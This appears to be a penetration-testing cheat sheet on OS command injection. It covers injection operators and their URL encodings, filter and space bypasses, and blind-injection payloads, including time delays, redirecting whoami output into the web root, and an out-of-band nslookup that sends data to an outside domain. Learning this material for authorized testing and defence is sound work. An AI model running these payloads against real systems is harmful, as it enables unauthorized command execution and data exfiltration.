# OS Injection

{% hint style="info" %}
* The user input we control must directly or indirectly go into (or somehow affect) a web query that executes system commands. All web programming languages have different functions that enable the developer to execute operating system commands directly on the back-end server.
* **PHP Functions :** `exec`, `system`, `shell_exec`, `passthru`, or `popen`&#x20;
* **NodeJS Funtions :** `child_process.exec` or `child_process.spawn`


{% endhint %}

| Semicolon  | `;`    | `%3b`       | Both                                       |
| ---------- | ------ | ----------- | ------------------------------------------ |
| New Line   | `\n`   | `%0a`       | Both                                       |
| Background | `&`    | `%26`       | Both (second output generally shown first) |
| Pipe       | `\|`   | `%7c`       | Both (only second output is shown)         |
| AND        | `&&`   | `%26%26`    | Both (only if first succeeds)              |
| OR         | `\|\|` | `%7c%7c`    | Second (only if first fails)               |
| Sub-Shell  | ` `` ` | `%60%60`    | Both **(Linux-only)**                      |
| Sub-Shell  | `$()`  | `%24%28%29` | Both **(Linux-only)**                      |

* **Command separators**:  (`&`, `|`, `&&`, `||`, `0x0a` or `\n` or `%0a`) -> works for both windows and UNIX
* **Unix specific Separators** - `;`, `` `injected command` ``, `$(injected command)`
* Might need to close the quotes(", ') for command to execute
* eg: `& echo hello &`, `& ping -c 10 127.0.0.1` (blind)
* Useful commands - `whoami`, `uname -a`, `ifconfig`, `netstat -an`, `ps -ef` (linux), `ipconfig /all`, `tasklist` (windows)

### OS Command Injection <sub>(simple case)</sub>

* Check whether any input parameters execute OS commands
* eg:  `& echo helloworld &`&#x20;

### Bypass Filters

* #### Identifying Filters
  * **Filter/WAF Detection** - Try the usual operators we tested, like (`;`, `&&`, `||`). If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF
  * **Blacklisted Characters** - Identify characters that are blocked.
* #### Bypass Blacklisted Operators <a href="#bypass-blacklisted-operators" id="bypass-blacklisted-operators"></a>
  * Fuzz for the accepted oprator initial befere appending a command.
* #### Bypass Blacklisted Spaces <a href="#bypass-blacklisted-spaces" id="bypass-blacklisted-spaces"></a>
  * Use Tabs - `%09`
  * Using $IFS - `${IFS}`  <sup><sub>(default value is a space and a tab in Linux)<sub></sup>

### Blind OS Command Injection with Time Delays

* `& ping -c 10 127.0.0.1 &` (try using different separators)
* Triggers a time delay to send 10 ICMP packets

### Blind OS Command Injection with Output Redirection

* Output the contents of a command to a text file that can be viewed in the browser
* Need to try in different folders that has write privilege
* eg:  `& whoami > var/www/html/whoami.txt &`

### Blind OS Command Injection with Out-of-Band Interaction

* Make use of burp collaborator to initiate a `nslookup`
* eg: `& nslookup domain.com &`, `& nslookup whoami.domain.com &`
